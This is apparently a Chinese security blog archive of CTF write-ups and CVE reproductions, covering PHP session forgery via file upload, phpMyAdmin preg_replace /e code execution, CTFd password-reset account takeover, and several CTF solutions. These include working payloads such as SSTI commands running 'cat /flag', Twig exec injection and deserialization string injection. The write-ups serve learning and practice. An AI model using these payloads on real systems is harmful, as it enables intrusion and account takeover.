    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
}
$direction = filter_input(INPUT_POST, &#39;direction&#39;);
$attr = filter_input(INPUT_POST, &#39;attr&#39;);
$dir_path = &quot;/var/babyctf/&quot;.$attr;
if($attr===&quot;private&quot;){
    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
}
if($direction === &quot;upload&quot;){
    try{
        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
            throw new RuntimeException(&#39;invalid upload&#39;);
        }
        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
            $upload_result = &quot;uploaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
} elseif ($direction === &quot;download&quot;) {
    try{
        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
        $file_path = $dir_path.&quot;/&quot;.$filename;
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException(&#39;file not exist&#39;);
        }
        header(&#39;Content-Type: application/force-download&#39;);
        header(&#39;Content-Length: &#39;.filesize($file_path));
        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
        if(readfile($file_path)){
            $download_result = &quot;downloaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}
?&gt;</code></pre>
<p>因为上传目录和sess文件所在目录相同，可以伪造sess</p>
<pre><code>POST / HTTP/1.1
Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
Content-Length: 395
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=7d93710a783397f3be0ba7165a60faed;
Connection: close

------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;direction&quot;

upload
------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;attr&quot;


------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
Content-Type: text/plain

\x08usernames:5:&quot;admin&quot;;
------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
</code></pre><p>成功伪造admin身份</p>
<p>接下来就是要弄个success.txt了，虽然我们文件名会被加个后缀</p>
<p>但是我们可以通过创建<code>success.txt</code>文件夹来达到相同效果</p>
<pre><code class="php">POST / HTTP/1.1
Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
Content-Length: 406
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: UM_distinctid=16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1587227364; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1587344461; PHPSESSID=7d93710a783397f3be0ba7165a60faed; __jsluid_h=7a2212833688aca0c2569475f7bdeffd
Connection: close

------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;direction&quot;

upload
------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;attr&quot;

success.txt
------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
Content-Type: text/plain

usernames:5:&quot;admin&quot;;
------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
</code></pre>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200420103357.png" alt="image13059"></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/">http://blog.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-id="cka3ckr1u0007v4v08dwn5ye5" data-title="2020数字中国创新大赛-虎符网络安全" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-phpmyadmin_登陆后_rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" class="article-date">
  <time class="dt-published" datetime="2020-04-03T13:39:15.744Z" itemprop="datePublished">2020-04-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/">phpmyadmin_登陆后_rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpmyadmin登陆后rce"><a href="#phpmyadmin登陆后rce" class="headerlink" title="phpmyadmin登陆后rce"></a>phpmyadmin登陆后rce</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote>
<p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p>
<p>以下版本受到影响：</p>
<ul>
<li>4.0.10.16之前4.0.x版本</li>
<li>4.4.15.7之前4.4.x版本</li>
<li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li>
</ul>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>全局搜索preg_replace,发现以下可能有可控变量的位置:</p>
<p>容易找到</p>
<p><code>TableSearch.lib.php</code></p>
<pre><code class="php">function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)
    {
        $column = $this-&gt;_columnNames[$columnIndex];
        $sql_query = &quot;SELECT &quot;
            . PMA_Util::backquote($column) . &quot;,&quot;
            . &quot; 1,&quot; // to add an extra column that will have replaced value
            . &quot; COUNT(*)&quot;
            . &quot; FROM &quot; . PMA_Util::backquote($this-&gt;_db)
            . &quot;.&quot; . PMA_Util::backquote($this-&gt;_table)
            . &quot; WHERE &quot; . PMA_Util::backquote($column)
            . &quot; RLIKE &#39;&quot; . PMA_Util::sqlAddSlashes($find) . &quot;&#39; COLLATE &quot;
            . $charSet . &quot;_bin&quot;; // here we
            // change the collation of the 2nd operand to a case sensitive
            // binary collation to make sure that the comparison is case sensitive
        $sql_query .= &quot; GROUP BY &quot; . PMA_Util::backquote($column)
            . &quot; ORDER BY &quot; . PMA_Util::backquote($column) . &quot; ASC&quot;;

        $result = $GLOBALS[&#39;dbi&#39;]-&gt;fetchResult($sql_query, 0);

        if (is_array($result)) {
            foreach ($result as $index=&gt;$row) {
                $result[$index][1] = preg_replace(
                    &quot;/&quot; . $find . &quot;/&quot;,
                    $replaceWith,
                    $row[0]
                );
            }
        }
        return $result;
    }</code></pre>
<p>如果我们可以控制<code>$result和$replaceWith</code>那么我们就可以执行任意命令</p>
<p><img src="https://i.loli.net/2020/04/03/qo5ZbfuJHKA9d6m.png" alt="image1674"></p>
<p>我们先看<code>getReplacePreview</code></p>
<p><img src="https://i.loli.net/2020/04/03/vnk9IZUxJ5YoMbW.png" alt="image1764"></p>
<p>再查看调用<code>getReplacePreview</code>的函数</p>
<p><img src="https://i.loli.net/2020/04/03/JxKS1TioFz4w7ql.png" alt="image1858"></p>
<p>去看第二个和第三个明显不行,这里就不贴出来了</p>
<p>再跟进<code>tbl_find_replace.php</code></p>
<pre><code class="php">if (isset($_POST[&#39;find&#39;])) {
    $preview = $table_search-&gt;getReplacePreview(
        $_POST[&#39;columnIndex&#39;],
        $_POST[&#39;find&#39;],
        $_POST[&#39;replaceWith&#39;],
        $_POST[&#39;useRegex&#39;],
        $connectionCharSet
    );
    $response-&gt;addJSON(&#39;preview&#39;, $preview);
    exit;
}</code></pre>
<p>明显白给</p>
<p>我们再回到<code>_getRegexReplaceRows</code>去查看它的第二个调用函数</p>
<p><img src="https://i.loli.net/2020/04/03/OhCPcviVT8tm6ZK.png" alt="image2318"></p>
<p>再查看调用replace的函数</p>
<p><img src="https://i.loli.net/2020/04/03/zT21ymqOYvUf5WE.png" alt="image2400"></p>
<p>同样后面两个还是不行</p>
<p>在跟进<code>tbl_find_replace.php</code></p>
<p><img src="https://i.loli.net/2020/04/03/j4JdNfKa8up2BCc.png" alt="image2504"></p>
<p>还是白给,两个调用链都是可以rce的,我们以前面那个为例</p>
<p>先往表中添加一条数据<code>INSERT INTO</code>flags<code>(</code>username<code>,</code>flag<code>,</code>msgid<code>) VALUES (UNHEX(&#39;302F6500&#39;),1,1);</code></p>
<p>直接抓包,修改</p>
<p><img src="https://i.loli.net/2020/04/03/FwSzMuNI4nDadBh.png" alt="image2701"></p>
<p><img src="https://i.loli.net/2020/04/03/QZE5fMTnUhPXdqV.png" alt="image2768"></p>
<p>成功</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>这个poc直接抄个别人的,懒得写了</p>
<p><code>https://www.exploit-db.com/exploits/40185</code></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/03/phpmyadmin_登陆后_rce/">http://blog.ccreater.top/2020/04/03/phpmyadmin_登陆后_rce/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" data-id="cka3ckr38003fv4v0bdtl7mnw" data-title="phpmyadmin_登陆后_rce" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-CTFd任意密码重置复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2020-04-01T10:40:44.718Z" itemprop="datePublished">2020-04-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/">CTFd任意密码重置复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTFd任意密码重置复现"><a href="#CTFd任意密码重置复现" class="headerlink" title="CTFd任意密码重置复现"></a>CTFd任意密码重置复现</h1><p>今天刚好做到一题CTFd的就顺便复现下</p>
<p>这是补丁的信息:<code>Strip spaces on registration and refine password reset</code></p>
<p>根据补丁信息去找register的代码</p>
<pre><code class="python">def register():
    errors = get_errors()
    if request.method == &quot;POST&quot;:
        name = request.form[&quot;name&quot;]
        email_address = request.form[&quot;email&quot;]
        password = request.form[&quot;password&quot;]

        name_len = len(name) == 0
        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()
        emails = (
            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)
            .filter_by(email=email_address)
            .first()
        )
        pass_short = len(password.strip()) == 0
        pass_long = len(password) &gt; 128
        valid_email = validators.validate_email(request.form[&quot;email&quot;])
        team_name_email_check = validators.validate_email(name)

        if not valid_email:
            errors.append(&quot;Please enter a valid email address&quot;)
        if email.check_email_is_whitelisted(email_address) is False:
            errors.append(
                &quot;Only email addresses under {domains} may register&quot;.format(
                    domains=get_config(&quot;domain_whitelist&quot;)
                )
            )
        if names:
            errors.append(&quot;That user name is already taken&quot;)
        if team_name_email_check is True:
            errors.append(&quot;Your user name cannot be an email address&quot;)
        if emails:
            errors.append(&quot;That email has already been used&quot;)
        if pass_short:
            errors.append(&quot;Pick a longer password&quot;)
        if pass_long:
            errors.append(&quot;Pick a shorter password&quot;)
        if name_len:
            errors.append(&quot;Pick a longer user name&quot;)

        if len(errors) &gt; 0:
            return render_template(
                &quot;register.html&quot;,
                errors=errors,
                name=request.form[&quot;name&quot;],
                email=request.form[&quot;email&quot;],
                password=request.form[&quot;password&quot;],
            )
        else:
            with app.app_context():
                user = Users(
                    name=name.strip(),
                    email=email_address.lower(),
                    password=password.strip(),
                )
                db.session.add(user)
                db.session.commit()
                db.session.flush()

                login_user(user)

                if config.can_send_mail() and get_config(
                    &quot;verify_emails&quot;
                ):  # Confirming users is enabled and we can send email.
                    log(
                        &quot;registrations&quot;,
                        format=&quot;[{date}] {ip} - {name} registered (UNCONFIRMED) with {email}&quot;,
                    )
                    email.verify_email_address(user.email)
                    db.session.close()
                    return redirect(url_for(&quot;auth.confirm&quot;))
                else:  # Don&#39;t care about confirming users
                    if (
                        config.can_send_mail()
                    ):  # We want to notify the user that they have registered.
                        email.sendmail(
                            request.form[&quot;email&quot;],
                            &quot;You&#39;ve successfully registered for {}&quot;.format(
                                get_config(&quot;ctf_name&quot;)
                            ),
                        )

        log(&quot;registrations&quot;, &quot;[{date}] {ip} - {name} registered with {email}&quot;)
        db.session.close()

        if is_teams_mode():
            return redirect(url_for(&quot;teams.private&quot;))

        return redirect(url_for(&quot;challenges.listing&quot;))
    else:
        return render_template(&quot;register.html&quot;, errors=errors)
</code></pre>
<p>阅读代码发现,查询用户名是否重复是直接将我们的输入拿去查询</p>
<pre><code class="python">        name = request.form[&quot;name&quot;]
        email_address = request.form[&quot;email&quot;]
        password = request.form[&quot;password&quot;]

        name_len = len(name) == 0
        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()#这里这里
        emails = (
            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)
            .filter_by(email=email_address)
            .first()
        )
        if names:
            errors.append(&quot;That user name is already taken&quot;)</code></pre>
<p>而验证没有重复后,则将我们输入的用户名strip后,在添加到数据库,也就是说我们可以在数据库弄多个同名账号</p>
<pre><code class="python">            user = Users(
                    name=name.strip(),
                    email=email_address.lower(),
                    password=password.strip(),
                )</code></pre>
<p>CTFd重置密码会收到这样的email</p>
<pre><code>Did you initiate a password reset? Click the following link to reset your password:

http://f04e02df-7759-45ba-a2b2-b89399e91ca0.node3.buuoj.cn/reset_password/ImFkbWluIg.XoRn7w.CDy8yi95cLlHsZN_YRiCp9Z-mX4</code></pre><p>我们去找<code>/reset_password/&lt;xxx&gt;</code>的路由</p>
<pre><code class="python">@auth.route(&quot;/reset_password&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])
@auth.route(&quot;/reset_password/&lt;data&gt;&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])
@ratelimit(method=&quot;POST&quot;, limit=10, interval=60)
def reset_password(data=None):
    if data is not None:
        try:
            name = unserialize(data, max_age=1800)
        except (BadTimeSignature, SignatureExpired):
            return render_template(
                &quot;reset_password.html&quot;, errors=[&quot;Your link has expired&quot;]
            )
        except (BadSignature, TypeError, base64.binascii.Error):
            return render_template(
                &quot;reset_password.html&quot;, errors=[&quot;Your reset token is invalid&quot;]
            )
        if request.method == &quot;GET&quot;:
            return render_template(&quot;reset_password.html&quot;, mode=&quot;set&quot;)
        if request.method == &quot;POST&quot;:
            user = Users.query.filter_by(name=name).first_or_404()
            user.password = request.form[&quot;password&quot;].strip()
            db.session.commit()
            log(
                &quot;logins&quot;,
                format=&quot;[{date}] {ip} -  successful password reset for {name}&quot;,
                name=name,
            )
            db.session.close()
            return redirect(url_for(&quot;auth.login&quot;))</code></pre>
<p>我们发现,重置密码是根据用户名查出的第一个记录进行修改<code>user = Users.query.filter_by(name=name).first_or_404()</code></p>
<p>这样我们就成功覆盖了之前真实用户的密码而不是我们创建的用户</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/01/CTFd任意密码重置复现/">http://blog.ccreater.top/2020/04/01/CTFd任意密码重置复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/" data-id="cka3ckr20000gv4v0ag8cb0uo" data-title="CTFd任意密码重置复现" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-3月做题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/" class="article-date">
  <time class="dt-published" datetime="2020-04-01T09:49:54.431Z" itemprop="datePublished">2020-04-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/">3月做题</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="3月做题"><a href="#3月做题" class="headerlink" title="3月做题"></a>3月做题</h1><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><pre><code class="php">&lt;?php

$function = @$_GET[&#39;f&#39;];

function filter($img){
    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
    return preg_replace($filter,&#39;&#39;,$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
$_SESSION[&#39;function&#39;] = $function;

extract($_POST);

if(!$function){
    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
}

if(!$_GET[&#39;img_path&#39;]){
    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
}else{
    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
}

$serialize_info = filter(serialize($_SESSION));

if($function == &#39;highlight_file&#39;){
    highlight_file(&#39;index.php&#39;);
}else if($function == &#39;phpinfo&#39;){
    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
}else if($function == &#39;show_image&#39;){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
}</code></pre>
<pre><code class="php">function filter($img){
    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
    return preg_replace($filter,&#39;&#39;,$img);
}
extract($_POST);
$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
$serialize_info = filter(serialize($_SESSION));
$userinfo = unserialize($serialize_info);
echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</code></pre>
<p>我们利用filter来吞掉一些字符,从而让我们任意反序列化</p>
<p><code>POST: _SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:12:&quot;aW5kZXgucGhw&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></p>
<p>我们分析一下为什么是这个payload:</p>
<p>…</p>
<p>在phpinfo中找到</p>
<table>
<thead>
<tr>
<th>config</th>
<th>Local Value</th>
<th>Mastr Value</th>
</tr>
</thead>
<tbody><tr>
<td>auto_append_file</td>
<td>d0g3_f1ag.php</td>
<td>d0g3_f1ag.php</td>
</tr>
</tbody></table>
<pre><code>_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}
_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></pre><pre><code class="php">
&lt;?php

$flag = &#39;flag in /d0g3_fllllllag&#39;;

?&gt;</code></pre>
<p><code>flag{62b16099-c29d-499a-9dde-e54bf2985b31}</code></p>
<h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><pre><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>md5($var,true)会返回一个原始的二进制数据，某些数据会被当成字符串</p>
<blockquote>
<p>raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(原始值会包含mysql中的特殊字符，因此很危险）。</p>
</blockquote>
<p>   特殊字符串:</p>
<blockquote>
<p>129581926211651571912466741651878684928<br>ffifdyop</p>
</blockquote>
<h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><pre><code class="php">&lt;?php

include &#39;flag.php&#39;;

$yds = &quot;dog&quot;;
$is = &quot;cat&quot;;
$handsome = &#39;yds&#39;;

foreach($_POST as $x =&gt; $y){
    $$x = $y;
}

foreach($_GET as $x =&gt; $y){
    $$x = $$y;
}
#$x=handsome $y=flag
foreach($_GET as $x =&gt; $y){
    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){
        exit($handsome);
    }
}

if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
    exit($yds);
}

if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
    exit($is);
}



echo &quot;the flag is: &quot;.$flag;</code></pre>
<p><code>/index.php?yds=flag</code></p>
<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>根据题目的提示,修改xff头,发现可以修改ip,但是修改成127.0.0.1后没有啥东西</p>
<p>后来在fuzz的过程中发现,有ssti漏洞</p>
<pre><code>GET /flag.php HTTP/1.1
Host: node3.buuoj.cn:27223
Upgrade-Insecure-Requests: 1
X-Forwarded-For: {system(&#39;cat /flag&#39;)}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://node3.buuoj.cn:27223/
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; JSESSIONID=0740A2433DEA975EE0C0C0CC0D0257D0
Connection: close</code></pre><h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><pre><code class="php">&lt;?php

error_reporting(0);
$text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;)){
    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
    if(preg_match(&quot;/flag/&quot;,$file)){
        die(&quot;Not now!&quot;);
    }

    include($file);  //next.php

}
else{
    highlight_file(__FILE__);
}
?&gt;</code></pre>
<pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?text=data://text/plain,I%20have%20a%20dream&amp;file=next.php</code></pre><p>next.php</p>
<pre><code class="php">&lt;?php
$id = $_GET[&#39;id&#39;];
$_SESSION[&#39;id&#39;] = $id;

function complex($re, $str) {
    return preg_replace(
        &#39;/(&#39; . $re . &#39;)/ei&#39;,
        &#39;strtolower(&quot;\\1&quot;)&#39;,
        $str
    );
}


foreach($_GET as $re =&gt; $str) {
    echo complex($re, $str). &quot;\n&quot;;
}

function getFlag(){
    @eval($_GET[&#39;cmd&#39;]);
}
</code></pre>
<pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?&amp;\D*=${getFlag()}&amp;file=next.php&amp;text=data://,I%20have%20a%20dream&amp;cmd=system(%27cat%20/flag%27);</code></pre><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>根据提示发现</p>
<pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user=admin</code></pre><p>fuzz过程中猜测是ssti</p>
<p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="image4749"></p>
<p>检测出是twig</p>
<pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>在index.php.swp中找到源码</p>
<pre><code class="php">&lt;?php
    ob_start();
    function get_hash(){
        $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;
        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
        $content = uniqid().$random;
        return sha1($content); 
    }
    header(&quot;Content-Type: text/html;charset=utf-8&quot;);
    ***
    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )
    {
        $admin = &#39;6d0bc1&#39;;
        if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) {
            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;
            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;
            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
            $text = &#39;
            ***
            ***
            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;
            ***
            ***&#39;;
            fwrite($shtml,$text);
            fclose($shtml);
            ***
            echo &quot;[!] Header  error ...&quot;;
        } else {
            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;

    }else
    {
    ***
    }
    ***
?&gt;</code></pre>
<p>爆破得到密码,</p>
<p>因为将用户名插入到了shtml,造成ssi rce</p>
